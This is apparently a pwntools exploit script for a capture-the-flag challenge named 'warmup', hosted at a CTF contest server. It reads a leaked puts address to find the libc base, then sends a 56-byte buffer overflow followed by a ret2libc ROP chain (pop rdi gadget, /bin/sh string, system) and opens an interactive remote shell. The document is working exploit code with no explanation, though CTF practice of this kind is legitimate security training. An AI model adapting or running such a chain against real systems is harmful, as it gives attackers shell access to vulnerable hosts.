from pwn import *

if args.LOCAL:
	p = process("./warmup")
	elf = ELF("./warmup")
	libc = elf.libc
else:
	p = remote("challenges.uactf.com.au",30005)
	libc = ELF("./warmup.so")

elf = ELF("./warmup")
context.arch = "amd64"


pop_rdi = p64(0x401255)
ret = p64(0x40101a)

p.sendline(b"-1")
p.recvuntil(b"bit.. ")
puts = int(p.recvline().strip().ljust(8,b'\x00'),16)
libc.address = puts - libc.sym['puts']
success(f"Puts: {hex(puts)}")
success(f"Libc Base Addr: {hex(libc.address)}")

binsh = next(libc.search(b'/bin/sh\x00'))
system = p64(libc.sym['system'])

payload = b"A" * 56
payload += pop_rdi
payload += p64(binsh)
payload += ret
payload += system

p.sendline(payload)
p.interactive()
